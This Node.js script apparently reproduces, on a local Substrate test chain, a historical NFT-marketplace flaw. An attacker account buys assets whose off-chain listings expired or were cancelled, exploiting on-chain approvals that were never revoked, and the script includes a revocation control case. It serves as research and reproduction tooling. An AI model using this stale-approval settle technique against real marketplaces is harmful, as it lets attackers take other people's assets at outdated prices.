'use strict';

// OS-LEGACY-PROBE v2: reproduce the OpenSea-era (pre-fix) listing attack on the
// OS-Legacy market contract (attack-time semantics of [7]):
//   - listing book (price / expiry / cancel) lives OFF-CHAIN
//   - on-chain approval long-lived until explicitly revoked
//   - settle validates ONLY on-chain ownership + un-revoked approval
// Each scenario uses an independent asset. v2 fixes the owner query origin,
// treats the OS-2b expected rejection as a recorded outcome (not a fatal error),
// and adds approval diagnostics.

const fs = require('fs');
const path = require('path');
const Module = require('module');

const DRIVER_ROOT = process.env.POLKADOT_DRIVER_ROOT;
const requireFromDriver = Module.createRequire(path.join(DRIVER_ROOT, 'package.json'));

function dep(name) {
  try { return require(name); } catch (_error) { return requireFromDriver(name); }
}

const { ApiPromise, WsProvider } = dep('@polkadot/api');
const { blake2AsU8a, cryptoWaitReady, decodeAddress } = dep('@polkadot/util-crypto');
const { hexToU8a, stringToU8a, u8aConcat, u8aToHex } = dep('@polkadot/util');
const {
  fundSharedAccounts,
  sendTx,
  sharedAccounts,
} = require('../scenarios/s314_live_common');

const RPC = process.env.ASSETX_RPC || 'ws://127.0.0.1:9944';
const WASM_PATH = process.env.OS_LEGACY_WASM;
const UNIT = 1_000_000_000_000n;
const GAS_LIMIT = { refTime: '1000000000000', proofSize: '104857600' };
const PRICE = 10n * UNIT;

const LEGACY_ERRORS = {
  0: 'AssetExists', 1: 'NotOwner', 2: 'NoApproval', 3: 'ApprovalRevoked',
  4: 'WrongPayment', 5: 'TransferFailed', 6: 'NotApprovedSeller',
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function le(value, bytes) {
  let current = BigInt(value);
  const result = new Uint8Array(bytes);
  for (let index = 0; index < bytes; index += 1) {
    result[index] = Number(current & 0xffn);
    current >>= 8n;
  }
  return result;
}

function selector(name) {
  return blake2AsU8a(name, 256).slice(0, 4);
}

function fixed32(value) {
  const bytes = typeof value === 'string' ? hexToU8a(value) : value;
  assert(bytes.length === 32, `expected 32 bytes, got ${bytes.length}`);
  return bytes;
}

function accountHex(account) {
  return u8aToHex(decodeAddress(account.address || account));
}

function contractData(api, name, args = []) {
  return u8aToHex(u8aConcat(
    selector(name),
    ...args.map(([type, value]) => (type ? api.createType(type, value).toU8a() : value))
  ));
}

function findEvent(records, section, method) {
  return records.find(({ event }) => event.section === section && event.method === method);
}

function countEvent(records, section, method) {
  return records.filter(({ event }) => event.section === section && event.method === method).length;
}

async function dryRunLegacy(api, origin, contractAddress, data, value) {
  const result = await api.call.contractsApi.call(
    origin.address,
    contractAddress,
    value,
    GAS_LIMIT,
    null,
    data
  );
  const json = result.toJSON();
  return {
    raw: json,
    data: json.result && json.result.ok ? json.result.ok.data : null,
    reverted: json.result && json.result.ok ? json.result.ok.flags.bits !== 0 : true,
  };
}

function decodeLegacyResult(dataHex) {
  const bytes = hexToU8a(dataHex);
  assert(bytes.length >= 1, `short ink return: ${dataHex}`);
  if (bytes[0] === 0) return { ok: true };
  if (bytes[0] === 1) {
    const code = bytes.length >= 2 ? bytes[1] : -1;
    return { ok: false, error: LEGACY_ERRORS[code] || `Error(${code})`, code };
  }
  return { ok: false, error: `UnknownInkReturn(${dataHex})` };
}

async function legacyProbe(api, contractAddress, signer, label, data, value = '0') {
  const dry = await dryRunLegacy(api, signer, contractAddress, data, value);
  let decoded = null;
  if (dry.data) decoded = decodeLegacyResult(dry.data);
  let submitted = null;
  if (decoded && decoded.ok) {
    try {
      const tx = api.tx.contracts.call(contractAddress, value, GAS_LIMIT, null, data);
      submitted = await sendTx(api, label, tx, signer, null);
    } catch (error) {
      submitted = { dispatchError: String(error && error.message || error) };
    }
  }
  const header = await api.rpc.chain.getHeader();
  return {
    label,
    block: header.number.toNumber(),
    reverted: dry.reverted,
    decoded,
    submitted: submitted ? {
      ok: Boolean(submitted.events && (findEvent(submitted.events, 'contracts', 'ContractEmitted'))),
      emitted: submitted.events ? countEvent(submitted.events, 'contracts', 'ContractEmitted') : 0,
      dispatchError: submitted.dispatchError || null,
      block: submitted.blockNumber,
    } : null,
  };
}

async function contractQuery(api, origin, contractAddress, data) {
  const result = await api.call.contractsApi.call(
    origin.address,
    contractAddress,
    '0',
    GAS_LIMIT,
    null,
    data
  );
  const json = result.toJSON();
  return {
    raw: json,
    data: json.result && json.result.ok ? json.result.ok.data : null,
    reverted: json.result && json.result.ok ? json.result.ok.flags.bits !== 0 : true,
  };
}

// ink 5 returns are wrapped as Result<T, _>: [0x00 Ok | 0x01 Err, ...]
// decode Result<Option<AccountId>>: [0x00, 0x00] -> None / [0x00, 0x01, 32B] -> Some
function decodeOptionAccount(dataHex) {
  if (!dataHex) return null;
  const bytes = hexToU8a(dataHex);
  if (bytes.length < 2 || bytes[0] !== 0) return null;
  if (bytes[1] === 0) return null;
  if (bytes.length < 34) return null;
  return u8aToHex(bytes.slice(2, 34));
}

// decode Result<Option<Approval>>: [0x00, 0x00] -> None / [0x00, 0x01, AccountId(32B), u32 LE] -> Some
function decodeOptionApproval(dataHex) {
  if (!dataHex) return null;
  const bytes = hexToU8a(dataHex);
  if (bytes.length < 2 || bytes[0] !== 0) return null;
  if (bytes[1] === 0) return null;
  if (bytes.length < 38) return { seller: 'short' };
  const seller = u8aToHex(bytes.slice(2, 34));
  const until = Number(BigInt(bytes[34]) | (BigInt(bytes[35]) << 8n) | (BigInt(bytes[36]) << 16n) | (BigInt(bytes[37]) << 24n));
  return { seller, approved_until: until };
}

async function main() {
  assert(WASM_PATH, 'OS_LEGACY_WASM required');
  await cryptoWaitReady();
  const api = await ApiPromise.create({ provider: new WsProvider(RPC) });
  await api.isReady;
  const accounts = sharedAccounts();
  const results = {};

  const wasm = fs.readFileSync(WASM_PATH);
  const wasmHex = u8aToHex(wasm);
  const salt = u8aToHex(blake2AsU8a(stringToU8a('os-legacy-probe-20261003'), 128));
  await fundSharedAccounts(api, accounts, { transactions: [], events: {} });

  const placeholderData = contractData(api, 'new', []);
  const predicted = await api.call.contractsApi.instantiate(
    accounts.MARKET_OK.address,
    '0',
    GAS_LIMIT,
    null,
    { Upload: wasmHex },
    placeholderData,
    salt
  );
  const predictedJson = predicted.toJSON();
  assert(predictedJson.result && predictedJson.result.ok, `deploy prediction failed: ${JSON.stringify(predictedJson.result)}`);
  const predictedAddress = predictedJson.result.ok.accountId;

  const deploy = await sendTx(
    api,
    'deploy_os_legacy',
    api.tx.contracts.instantiateWithCode('0', GAS_LIMIT, null, wasmHex, placeholderData, salt),
    accounts.MARKET_OK
  );
  const instantiated = findEvent(deploy.events, 'contracts', 'Instantiated');
  assert(instantiated, 'contracts.Instantiated missing');
  const contractAddress = instantiated.event.data[1].toString();
  assert(contractAddress === predictedAddress, 'deployed contract address differs from prediction');
  console.log('DEPLOY', JSON.stringify({ contractAddress, codeHash: u8aToHex(blake2AsU8a(wasm, 256)) }));

  const seller = accounts.OWNER;
  const attacker = accounts.BUYER_1;

  const asset = (byte) => `0x${byte.toString(16).padStart(2, '0').repeat(32)}`;

  // ============ OS-1: EXPIRED LISTING (off-chain expiry passed) ============
  {
    const a1 = asset(0x61);
    const reg = await legacyProbe(api, contractAddress, seller, 'os1_register', contractData(api, 'register_asset', [[null, fixed32(a1)]]));
    assert(reg.decoded && reg.decoded.ok, `os1 register failed: ${JSON.stringify(reg.decoded)}`);
    const appr = await legacyProbe(api, contractAddress, seller, 'os1_approve', contractData(api, 'approve', [[null, fixed32(a1)]]));
    assert(appr.decoded && appr.decoded.ok, `os1 approve failed: ${JSON.stringify(appr.decoded)}`);
    const approvalBefore = await contractQuery(api, attacker, contractAddress, contractData(api, 'approval_of', [[null, fixed32(a1)]]));
    const settle = await legacyProbe(
      api, contractAddress, attacker, 'os1_settle',
      contractData(api, 'settle', [
        [null, fixed32(a1)],
        ['AccountId', seller.address],
        [null, le(PRICE, 16)],
      ]),
      PRICE.toString()
    );
    const ownerQuery = await contractQuery(api, attacker, contractAddress, contractData(api, 'owner_of', [[null, fixed32(a1)]]));
    const ownerAfter = decodeOptionAccount(ownerQuery.data);
    results.os1 = {
      scenario: 'OS-1 expired listing (off-chain expiry passed, on-chain approval active)',
      listing: { price: PRICE.toString(), expiry: 'PAST', status: 'active' },
      register: { ok: reg.decoded.ok }, approve: { ok: appr.decoded.ok },
      approvalBefore: decodeOptionApproval(approvalBefore.data),
      ownerQueryRaw: ownerQuery.raw && ownerQuery.raw.result && ownerQuery.raw.result.ok
        ? { data: ownerQuery.raw.result.ok.data, flags: ownerQuery.raw.result.ok.flags } : ownerQuery.raw,
      settle, ownerAfter,
      attackSucceeded: Boolean(settle.submitted && settle.submitted.ok && ownerAfter === accountHex(attacker)),
    };
    console.log('RESULT_OS1', JSON.stringify(results.os1));
  }

  // ============ OS-2a: CANCELLED LISTING (off-chain cancel, approval NOT revoked) ============
  {
    const a2 = asset(0x62);
    const reg = await legacyProbe(api, contractAddress, seller, 'os2a_register', contractData(api, 'register_asset', [[null, fixed32(a2)]]));
    assert(reg.decoded && reg.decoded.ok, `os2a register failed: ${JSON.stringify(reg.decoded)}`);
    const appr = await legacyProbe(api, contractAddress, seller, 'os2a_approve', contractData(api, 'approve', [[null, fixed32(a2)]]));
    assert(appr.decoded && appr.decoded.ok, `os2a approve failed: ${JSON.stringify(appr.decoded)}`);
    const settle = await legacyProbe(
      api, contractAddress, attacker, 'os2a_settle',
      contractData(api, 'settle', [
        [null, fixed32(a2)],
        ['AccountId', seller.address],
        [null, le(PRICE, 16)],
      ]),
      PRICE.toString()
    );
    const ownerQuery = await contractQuery(api, attacker, contractAddress, contractData(api, 'owner_of', [[null, fixed32(a2)]]));
    const ownerAfter = decodeOptionAccount(ownerQuery.data);
    results.os2a = {
      scenario: 'OS-2a cancelled listing (off-chain cancel, on-chain approval NOT revoked)',
      listing: { price: PRICE.toString(), status: 'CANCELLED' },
      register: { ok: reg.decoded.ok }, approve: { ok: appr.decoded.ok },
      settle, ownerAfter,
      attackSucceeded: Boolean(settle.submitted && settle.submitted.ok && ownerAfter === accountHex(attacker)),
    };
    console.log('RESULT_OS2A', JSON.stringify(results.os2a));
  }

  // ============ OS-2b (control): on-chain revocation expressed (revoke approval) ============
  {
    const a3 = asset(0x63);
    const reg = await legacyProbe(api, contractAddress, seller, 'os2b_register', contractData(api, 'register_asset', [[null, fixed32(a3)]]));
    assert(reg.decoded && reg.decoded.ok, `os2b register failed: ${JSON.stringify(reg.decoded)}`);
    const appr = await legacyProbe(api, contractAddress, seller, 'os2b_approve', contractData(api, 'approve', [[null, fixed32(a3)]]));
    assert(appr.decoded && appr.decoded.ok, `os2b approve failed: ${JSON.stringify(appr.decoded)}`);
    const rev = await legacyProbe(api, contractAddress, seller, 'os2b_revoke', contractData(api, 'revoke', [[null, fixed32(a3)]]));
    assert(rev.decoded && rev.decoded.ok, `os2b revoke failed: ${JSON.stringify(rev.decoded)}`);
    const approvalAfter = await contractQuery(api, attacker, contractAddress, contractData(api, 'approval_of', [[null, fixed32(a3)]]));
    const settle = await legacyProbe(
      api, contractAddress, attacker, 'os2b_settle',
      contractData(api, 'settle', [
        [null, fixed32(a3)],
        ['AccountId', seller.address],
        [null, le(PRICE, 16)],
      ]),
      PRICE.toString()
    );
    const ownerQuery = await contractQuery(api, attacker, contractAddress, contractData(api, 'owner_of', [[null, fixed32(a3)]]));
    const ownerAfter = decodeOptionAccount(ownerQuery.data);
    results.os2b = {
      scenario: 'OS-2b (control) on-chain revocation expressed (revoke approval)',
      listing: { price: PRICE.toString(), status: 'CANCELLED' },
      register: { ok: reg.decoded.ok }, approve: { ok: appr.decoded.ok }, revoke: { ok: rev.decoded.ok },
      approvalAfter: decodeOptionApproval(approvalAfter.data),
      settle, ownerAfter,
      attackSucceeded: Boolean(settle.submitted && settle.submitted.ok && ownerAfter === accountHex(attacker)),
    };
    console.log('RESULT_OS2B', JSON.stringify(results.os2b));
  }

  const summary = {
    os1_attack_succeeded: results.os1.attackSucceeded,
    os1_settle: results.os1.settle.decoded,
    os2a_attack_succeeded: results.os2a.attackSucceeded,
    os2a_settle: results.os2a.settle.decoded,
    os2b_attack_succeeded: results.os2b.attackSucceeded,
    os2b_settle: results.os2b.settle.decoded,
    os2b_approvalAfter: results.os2b.approvalAfter,
  };
  console.log('SUMMARY', JSON.stringify(summary));
  process.exit(0);
}

main().catch((error) => {
  console.error('PROBE_FAILED', error && error.stack ? error.stack : String(error));
  process.exit(1);
});
